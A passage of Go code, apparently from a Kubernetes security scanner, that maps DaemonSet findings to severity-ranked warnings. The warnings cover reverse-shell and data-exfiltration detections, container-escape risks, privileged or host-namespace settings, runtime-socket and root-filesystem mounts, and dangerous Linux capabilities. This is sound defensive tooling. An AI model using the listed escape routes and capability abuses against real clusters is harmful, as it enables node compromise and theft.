		issues = append(issues, fmt.Sprintf("CRITICAL: Reverse shell patterns detected: %s - immediate investigation required", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Crypto mining patterns detected: %s - resource abuse on all nodes", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Data exfiltration patterns: %s - audit network traffic", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Container escape techniques detected: %s - cluster-wide compromise risk", strings.Join(finding.ContainerEscape, ", ")))
	}
	if len(finding.NodeCompromise) > 0 {
		issues = append(issues, fmt.Sprintf("CRITICAL: Node compromise patterns: %s - all %d nodes at risk", strings.Join(finding.NodeCompromise, ", "), finding.DesiredNodes))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, fmt.Sprintf("HIGH: Privileged DaemonSet running on %d nodes - kernel access on all nodes", finding.DesiredNodes))
	}
	if finding.HostPID {
		issues = append(issues, "HIGH: hostPID enabled - can view/kill all node processes")
	}
	if finding.HostIPC {
		issues = append(issues, "MEDIUM: hostIPC enabled - can access inter-process communication on nodes")
	}
	if finding.HostNetwork {
		issues = append(issues, "MEDIUM: hostNetwork enabled - can sniff network traffic on all nodes")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("CRITICAL: Container runtime socket mounted (%s) - cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "CRITICAL: Root filesystem mounted - complete node compromise")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("HIGH: Sensitive path mounted: %s", hp))
		} else {
			issues = append(issues, fmt.Sprintf("MEDIUM: HostPath volume: %s", hp))
		}
	}

	// Dangerous capabilities
	dangerousCaps := map[string]string{
		"SYS_ADMIN":       "full system administration",
		"SYS_MODULE":      "kernel module loading",
		"SYS_RAWIO":       "direct hardware access",
		"SYS_PTRACE":      "process debugging/injection",
		"DAC_READ_SEARCH": "bypass file read permissions",
		"NET_ADMIN":       "network configuration control",
		"SYS_BOOT":        "system reboot capability",
		"SYS_TIME":        "system time manipulation",
	}

	for _, cap := range finding.Capabilities {
		for dangerousCap, desc := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				issues = append(issues, fmt.Sprintf("HIGH: Dangerous capability %s - enables %s", dangerousCap, desc))
			}
		}
	}

	// RunAsUser check
	if finding.RunAsUser == "0" || finding.RunAsUser == "" {
		issues = append(issues, "MEDIUM: Running as root (UID 0) - should use non-root user")
	}

	// Wide deployment
	if finding.DesiredNodes > 50 {
		issues = append(issues, fmt.Sprintf("MEDIUM: DaemonSet on %d nodes - large attack surface", finding.DesiredNodes))
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("HIGH: Cloud admin role assigned: %s - review IAM permissions", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("LOW: Cloud IAM role: %s - verify least privilege", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "LOW: Using default service account - should use dedicated ServiceAccount with minimal RBAC")
	}

	// No issues found
	if len(issues) == 0 {
		issues = append(issues, "LOW: Standard DaemonSet configuration - no obvious security issues")
	}

	return issues
}
